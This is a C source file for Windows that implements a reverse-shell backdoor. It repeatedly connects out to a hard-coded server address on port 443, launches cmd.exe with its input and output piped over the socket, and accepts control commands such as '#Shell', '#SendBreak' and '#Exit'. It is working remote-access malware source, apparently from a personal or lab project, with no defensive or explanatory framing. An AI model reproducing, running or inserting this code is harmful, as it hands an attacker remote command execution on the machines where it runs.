// excludes certian API libs for more efficient builds
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <namedpipeapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>

// disable console https://stackoverflow.com/a/8732076/11567632

// Needed to Statically compile, otherwise VS C/C++ is needed
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "443"
#define DEFAULT_SERVER "192.168.72.157"

int confAddrInfo(struct addrinfo **result) {
	struct addrinfo hints;
	int iResult;

	// Config socket
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(DEFAULT_SERVER, DEFAULT_PORT, &hints, result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}
	return 0;
}

// WinSockApi
int wsaBindSocket(SOCKET *ConnectSocket, struct addrinfo *result) {
	int iResult;

	// Create a SOCKET for connecting to server
	// WSA_FLAG_OVERLAPPED can't be set with CreateProcess
	*ConnectSocket = WSASocket(result->ai_family, result->ai_socktype,
		result->ai_protocol, NULL, 0, 0);
	if (*ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	// Connect to server.
	iResult = WSAConnect(*ConnectSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		*ConnectSocket = INVALID_SOCKET;
	}
	return 0;
}

int bindSocket(SOCKET* ConnectSocket, struct addrinfo *result) {
	int iResult;

	*ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (*ConnectSocket == INVALID_SOCKET) {
		printf("Socket Error");
	}

	iResult = connect(*ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		*ConnectSocket = INVALID_SOCKET;
	}
	return 0;

}

// winapi > pipeing to cmd.exe
int shell(SOCKET* ConnectSocket) {
	// winapi > pipeing to cmd.exe
	int iResult = 0;
	printf("Spawning process\n");
	char Process[] = "C:\\Windows\\System32\\cmd.exe";
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;

	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
		printf("CreateProcess failed (%d).\n", GetLastError());
	}

	WaitForSingleObject(pinfo.hProcess, INFINITE); //blocks till proc finishes
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	printf("Process exited\n");

	return 0;
}

int spawnShell(SOCKET* ConnectSocket, HANDLE hReadPipe, STARTUPINFO *sinfo, PROCESS_INFORMATION *pinfo) {
	int iResult = 0;
	char Process[] = "C:\\Windows\\System32\\cmd.exe";
	memset(sinfo, 0, sizeof(*sinfo));
	sinfo->cb = sizeof(*sinfo);
	sinfo->dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	//sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;
	sinfo->hStdOutput = sinfo->hStdError = (HANDLE) *ConnectSocket;
	sinfo->hStdInput = hReadPipe;

	printf("Spawning process\n");
	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, sinfo, pinfo)) {
		printf("CreateProcess failed (%d).\n", GetLastError());
	}

}


// TODO: refactor shell into another function & add command to spawn rmbr to not pipe to recv if no shell is active
// better way to signel shell closed powershell exit

// pipe code for intermitten read testing / non-blocking IO
// cmd.exe notes: can't recieve buffer bigger than string+\0
//// handles can't be overlapped
int cli(SOCKET *ConnectSocket) {
	int iResult = 0;
	// process info
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;

	// create pipe for external commands
	SECURITY_ATTRIBUTES	 saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL;
	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	iResult = CreatePipe(&hReadPipe, &hWritePipe, &saAttr, DEFAULT_BUFLEN);
	if (iResult == 0) {
		printf("Pipe Error");
	}

	// set Socket into non-blocking
	u_long mode = 1;
	ioctlsocket(*ConnectSocket, FIONBIO, &mode);


	// set recv timeout
	//int timeout = 1000;
	//iResult = setsockopt(*ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *) &timeout, sizeof(int));

	// pipe command logic
	WSABUF DataBuf;
	DWORD flags = 0;
	char buf[DEFAULT_BUFLEN];
	DataBuf.len = DEFAULT_BUFLEN;
	DataBuf.buf = buf;
	DWORD wsaBytes = 0;
	DWORD err = 0;
	BOOL shell = 0; // determines if shell is active

	// greeting
	strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Connected\n");
	wsaBytes = 14;
	iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);

	while (1) {
		// clear buffer and buf length
		strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "\0");
		wsaBytes = 0;
		Sleep(100);

		if (shell) {
			iResult = WaitForSingleObject(pinfo.hProcess, 0); //blocks till proc finishes
			if (iResult == WAIT_OBJECT_0) {
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				shell = 0;
				strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Shell Closed\n");
				wsaBytes = 17;
				iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
			}
		}

		// try recieving from socket
		iResult = WSARecv(*ConnectSocket, &DataBuf, 1, &wsaBytes, &flags, NULL, NULL);
		if (iResult == SOCKET_ERROR) {
			err = WSAGetLastError();
			// recv timeout/non-blocking skip
			if (err == 10054) {
				printf("Connection reset\n");
				if (shell) {
					CloseHandle(pinfo.hProcess);
					CloseHandle(pinfo.hThread);
				}
				return 0;
			}
			if (err != 10035) {
				printf("WSARecv failed: %d\n", WSAGetLastError());
			}

			continue;
		}

		// TODO: migrate from strncmp and wsabytes maybe send message function dynamic buffer?

		// check for external command
		if (!strncmp(DataBuf.buf, "#Shell\n", 6) && !shell) {
			// send to sock
			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Spawning Shell\n");
			wsaBytes = 19;
			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
			spawnShell(ConnectSocket, hReadPipe,&sinfo,&pinfo);
			shell = 1;

			continue;
		}else if (!strncmp(DataBuf.buf, "#Commands\n", 9)) {
			// send to sock
			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "PlaceHolder\n");
			wsaBytes = 12;
			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);

			// send newline to cmd.exe
			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "\n");
			wsaBytes = 1;
			iResult = WriteFile(hWritePipe, DataBuf.buf, wsaBytes, NULL, NULL);
			continue;
		}else if (!strncmp(DataBuf.buf, "#SendBreak\n", 11) && shell) {
			printf("CTRL+Break recieved\n");
			// send to sock
			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Sending CTRL+C\n");
			wsaBytes = 19;
			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);

			// sending Break
			GenerateConsoleCtrlEvent(1, pinfo.dwProcessId);
			continue;
		}else if (!strncmp(DataBuf.buf, "#Exit\n", 6) && shell) {
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			shell = 0;
			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[-] Shell Closed\n");
			wsaBytes = 17;
			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
			continue;
		}else if (wsaBytes == 0) { // 0 bytes && no error means sock is closed
			printf("Sock Closed\n");
			return 0;
		}

		// probably a better way to do this with events
		//if (!strncmp(DataBuf.buf, "exit\n", 9)) {
		//	printf("cmd Closed\n");
		//}

		// only write if process is running
		// write recv'd buffer to process pipe
		if (shell) {
			iResult = WriteFile(hWritePipe, DataBuf.buf, wsaBytes, NULL, NULL);
			if (iResult == SOCKET_ERROR) {
				printf("WSASend failed: %d\n", WSAGetLastError());
			}
		}else if(strncmp(DataBuf.buf, "\n", 1)){ // not a newline
			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[!] Unknown Command\n");
			wsaBytes = 20;
			iResult = WriteFile(*ConnectSocket, DataBuf.buf, wsaBytes, NULL, NULL);
		}
	}

	printf("Process exited\n");

	return 0;
}

// stupid simple threading
int threadShell(SOCKET* ConnectSocket) {
	HANDLE thread = NULL;
	DWORD threadID = NULL;
	thread = CreateThread(NULL, 0, shell, ConnectSocket, 0, &threadID);
	return 0;
}

// old command
int oldcli(SOCKET* ConnectSocket) {
	int iResult;
	WSABUF DataBuf;
	DWORD wsaBytes;
    DWORD flags = 0;
	char buf[DEFAULT_BUFLEN];
	DataBuf.len = DEFAULT_BUFLEN;
	DataBuf.buf = buf;

	while (1) {
		// prompt
		strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "> ");
		iResult = WSASend(*ConnectSocket, &DataBuf, 1, &wsaBytes, flags, NULL, NULL);
		if (iResult == SOCKET_ERROR) {
			printf("send failed: %d\n", WSAGetLastError());
			return 1;
		}
		iResult = WSARecv(*ConnectSocket, &DataBuf, 1, &wsaBytes, &flags, NULL, NULL);
		if (iResult == SOCKET_ERROR) {
			printf("send failed: %d\n", WSAGetLastError());
			return 1;
		}

		printf("%.*s", wsaBytes,DataBuf.buf);
		if (!strncmp(DataBuf.buf, "shell\n", 6)) {
			shell(ConnectSocket);
		}else if (!strncmp(DataBuf.buf, "exit\n",5)) {
			printf("closing\n");
			return 0;
		}
		else {
			strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "[!] Command not recognized\n");
			iResult = WSASend(*ConnectSocket, &DataBuf, 1, &wsaBytes, flags, NULL, NULL);
		}

		// clean string
		strcpy_s(DataBuf.buf, DEFAULT_BUFLEN, "\0");
		wsaBytes = 0;
	}
	return 0;
}

int __cdecl main(int argc, char** argv)
{
	WSADATA wsaData;
	SOCKET ConnectSocket;
	struct addrinfo *result;
	int iResult;
	printf("Connecting to server\n");
	while (1) {
		ConnectSocket = INVALID_SOCKET;
		result = NULL;
		iResult = 0;

		// Initialize Winsock
		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0) {
			printf("WSAStartup failed with error: %d\n", iResult);
			continue;
		}

		// Ptr->Ptr PassbyRef
		iResult = confAddrInfo(&result);
		if (iResult != 0) {
			WSACleanup();
			continue;
		}

		iResult = wsaBindSocket(&ConnectSocket, result);
		if (iResult != 0) {
			WSACleanup();
			continue;
		}

		freeaddrinfo(result);
		if (ConnectSocket == INVALID_SOCKET) {
			WSACleanup();
			continue;
		}
		printf("Connected to Server\n");

		cli(&ConnectSocket);
		// cli(&ConnectSocket);
		if (iResult != 0) {
			WSACleanup();
			continue;
		}

		// shutdown the connection since no more data will be sent
		iResult = shutdown(ConnectSocket, SD_SEND);
		if (iResult == SOCKET_ERROR) {
			printf("shutdown failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			continue;
		}


		// cleanup
		closesocket(ConnectSocket);
		WSACleanup();
	}
	return 0;
}
